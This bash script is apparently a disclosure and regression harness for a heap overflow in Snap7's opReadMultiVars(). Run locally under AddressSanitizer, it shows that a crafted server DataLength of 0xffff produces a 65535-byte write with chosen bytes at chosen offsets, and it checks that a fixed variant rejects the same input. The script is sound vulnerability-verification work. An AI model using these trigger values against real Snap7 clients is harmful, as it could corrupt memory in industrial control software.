#!/bin/bash
# CVE-2026-131848 / GHSA-xr6p-cjp3-pvwg — Snap7 opReadMultiVars() unchecked
# server DataLength. Direct-call ASan + adjacent-heap harness. Every run
# re-extracts the verbatim pinned function and asserts SHA-256. No daemon,
# no listener, no off-loopback probe.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln fixed
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc fixed/*.inc p-vuln p-fixed a-vuln-gcc a-vuln-clang a-fixed-gcc
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi; }
hasnt() { if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi; }
srcsha() { sha256sum "$1" | cut -d' ' -f1; }

# --- pinned bytes -----------------------------------------------------------
[ "$(srcsha ../src/s7_micro_client.cpp.30f37da)" = \
  d42d94c458b6534a1070ee5506ce3f784be3af5bb91de4f88ea4f9dea7c0c486 ] \
  && ok "pin-vuln-source-sha256" || no "pin-vuln-source-sha256"
[ "$(srcsha ../src/s7_types.h.30f37da)" = \
  bee4013a518284a3199b662b275a683168426cac00708233595068b0b1388987 ] \
  && ok "pin-types-header-sha256" || no "pin-types-header-sha256"
[ "$(srcsha ../src/s7_isotcp.h.30f37da)" = \
  b5824be72e60b39268c8fc1e5aee7fed05f4a4be93399fa1bac5333147273f6b ] \
  && ok "pin-isotcp-header-sha256" || no "pin-isotcp-header-sha256"
[ "$(srcsha ../src/s7_micro_client.h.30f37da)" = \
  2c1a9eea0290ad72669d13f3db52883641076285652dbaa39fd7ec9dcb1f897c ] \
  && ok "pin-client-header-sha256" || no "pin-client-header-sha256"
[ "$(srcsha ../src/opReadMultiVars.fixed.issue32.cpp)" = \
  a4127166e9274f8fbefbda4f0536ad33808bed7135277ad93593ce02c322b233 ] \
  && ok "pin-fixed-slice-sha256" || no "pin-fixed-slice-sha256"
[ "$(srcsha driver.cpp)" = \
  f55049233440ce078c62826685d799d4d601414c8608b16be34dafdd34db5c05 ] \
  && ok "driver-sha256" || no "driver-sha256"

# --- verbatim slices: re-extracted from the pinned source on every run ------
{ echo '#line 307 "s7_micro_client.cpp.30f37da"'
  sed -n '307,431p' ../src/s7_micro_client.cpp.30f37da; } > vuln/opReadMultiVars.inc
cp ../src/opReadMultiVars.fixed.issue32.cpp fixed/opReadMultiVars.inc

[ "$(srcsha vuln/opReadMultiVars.inc)" = \
  2ea5cd3d0bb8983cbbfbed4ec46c27d6ca63a3309dd79b53e0e940b49891eec2 ] \
  && ok "verbatim-vuln-slice-sha256" || no "verbatim-vuln-slice-sha256"
[ "$(srcsha fixed/opReadMultiVars.inc)" = \
  a4127166e9274f8fbefbda4f0536ad33808bed7135277ad93593ce02c322b233 ] \
  && ok "verbatim-fixed-slice-sha256" || no "verbatim-fixed-slice-sha256"
[ "$(grep -cF 'memcpy(Item->pdata, ResData[c]->Data, Slice);' vuln/opReadMultiVars.inc)" = 1 ] \
  && ok "vuln-unchecked-memcpy-present" || no "vuln-unchecked-memcpy-present"
hasnt vuln/opReadMultiVars.inc 'MaxDest' 'vuln-has-no-dest-bound'
has fixed/opReadMultiVars.inc 'int MaxDest = Item->Amount * DataSizeByte(Item->WordLen);' \
  'fixed-bound-tied-to-caller-amount'
has fixed/opReadMultiVars.inc 'int(Slice) > MaxRecv' 'fixed-bound-tied-to-received-size'

# --- build ------------------------------------------------------------------
g++ -O0 -g -std=gnu++11 -o p-vuln driver.cpp 2> "$E/build-p-vuln.log" \
  && ok "build-plain-vuln" || no "build-plain-vuln"
g++ -O0 -g -std=gnu++11 -DFIXED_VARIANT -o p-fixed driver.cpp 2> "$E/build-p-fixed.log" \
  && ok "build-plain-fixed" || no "build-plain-fixed"
g++ -O0 -g -std=gnu++11 -fsanitize=address -o a-vuln-gcc driver.cpp \
  2> "$E/build-a-vuln-gcc.log" && ok "build-asan-gcc-vuln" || no "build-asan-gcc-vuln"
if command -v clang++ >/dev/null 2>&1; then
  clang++ -O0 -g -std=gnu++11 -fsanitize=address -o a-vuln-clang driver.cpp \
    2> "$E/build-a-vuln-clang.log" && ok "build-asan-clang-vuln" || no "build-asan-clang-vuln"
else
  no "build-asan-clang-vuln"
fi
g++ -O0 -g -std=gnu++11 -DFIXED_VARIANT -fsanitize=address -o a-fixed-gcc driver.cpp \
  2> "$E/build-a-fixed-gcc.log" && ok "build-asan-gcc-fixed" || no "build-asan-gcc-fixed"

# --- rung 1: wire-controlled arithmetic, no function call -------------------
./p-vuln arith ffff 1 9 5a > "$E/arith-vuln.out" 2>&1
has "$E/arith-vuln.out" 'DATALEN=65535' 'r1-wire-datalen-65535'
has "$E/arith-vuln.out" 'SLICE=65535' 'r1-octet-slice-not-divided'
has "$E/arith-vuln.out" 'MAXDEST=1' 'r1-caller-buffer-one-byte'
has "$E/arith-vuln.out" 'SLICE_OVER_MAXDEST=65534' 'r1-oob-extent'
./p-vuln arith ffff 1 4 5a > "$E/arith-byte.out" 2>&1
has "$E/arith-byte.out" 'SLICE=8191' 'r1-byte-transport-slice-8191'

# --- rung 2 + rung 4: chosen wire bytes land at chosen offsets --------------
./p-vuln plain ffff 1 9 5a > "$E/plain-vuln-5a.out" 2>&1
has "$E/plain-vuln-5a.out" 'RC=0' 'r2-vuln-returns-zero'
has "$E/plain-vuln-5a.out" 'DEST0=5a' 'r4-chosen-5a-at-offset-0'
has "$E/plain-vuln-5a.out" 'DEST17=6b' 'r4-chosen-6b-at-offset-17'
has "$E/plain-vuln-5a.out" 'DEST64=00' 'r4-beyond-wire-reads-zeroed-pdu'
./p-vuln plain ffff 1 9 3c > "$E/plain-vuln-3c.out" 2>&1
has "$E/plain-vuln-3c.out" 'DEST0=3c' 'r4-chosen-3c-at-offset-0'
has "$E/plain-vuln-3c.out" 'DEST17=4d' 'r4-chosen-4d-at-offset-17'
hasnt "$E/plain-vuln-3c.out" 'DEST0=5a' 'r4-no-stale-5a'

# --- rung 3: ASan WRITE of 65535 at the one-byte dest allocation -----------
./a-vuln-gcc asan ffff 1 9 5a > "$E/vuln-gcc-asan.out" 2>&1
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'WRITE of size 65535' 'r3-gcc-asan-write-65535'
has "$E/vuln-gcc-asan.out" '0 bytes after 1-byte region' 'r3-gcc-asan-at-dest-end'
has "$E/vuln-gcc-asan.out" 'in TSnap7MicroClient::opReadMultiVars' 'r3-gcc-asan-vulnerable-frame'
if [ -x a-vuln-clang ]; then
  ./a-vuln-clang asan ffff 1 9 5a > "$E/vuln-clang-asan.out" 2>&1
  has "$E/vuln-clang-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-clang-asan-overflow'
  has "$E/vuln-clang-asan.out" 'WRITE of size 65535' 'r3-clang-asan-write-65535'
  has "$E/vuln-clang-asan.out" '0 bytes after 1-byte region' 'r3-clang-asan-at-dest-end'
fi

# --- fixed control: suggested issue #32 guard rejects before the copy ------
./p-fixed plain ffff 1 9 5a > "$E/fixed-plain.out" 2>&1
has "$E/fixed-plain.out" 'RC=8388608' 'fixed-returns-errCliInvalidPlcAnswer'
has "$E/fixed-plain.out" 'DEST0=a5' 'fixed-dest-untouched'
./a-fixed-gcc asan ffff 1 9 5a > "$E/fixed-gcc-asan.out" 2>&1
hasnt "$E/fixed-gcc-asan.out" 'ERROR: AddressSanitizer' 'fixed-asan-clean'
has "$E/fixed-gcc-asan.out" 'RC=8388608' 'fixed-asan-rejects'

# --- safe control: in-bounds declared length stays clean -------------------
./p-vuln safe 0001 1 9 5a > "$E/vuln-safe.out" 2>&1
has "$E/vuln-safe.out" 'RC=0' 'safe-vuln-decodes-cleanly'
has "$E/vuln-safe.out" 'DEST0=5a' 'safe-first-byte-as-sent'
./a-vuln-gcc asan 0001 1 9 5a > "$E/vuln-gcc-asan-safe.out" 2>&1
hasnt "$E/vuln-gcc-asan-safe.out" 'ERROR: AddressSanitizer' 'safe-asan-clean'

# --- deterministic normalized trace: no PID, address, path or frame number --
{
  echo "PASS=$PASS FAIL=$FAIL"
  cat "$E/arith-vuln.out" "$E/plain-vuln-5a.out" "$E/vuln-gcc-asan.out"
} | sed -E 's#/[^ ]*/lab/frontier#lab/frontier#g; s/0x[0-9a-f]+/0xADDR/g; s/#[0-9]+ /#FRAME /g; s/==[0-9]+==/==PID==/g; s#in TSnap7MicroClient::opReadMultiVars [^ ]+#in TSnap7MicroClient::opReadMultiVars SOURCE#g' > "$E/normalized.txt"
TRACE=$(srcsha "$E/normalized.txt")
printf 'TRACE_SHA256=%s\n' "$TRACE"

printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
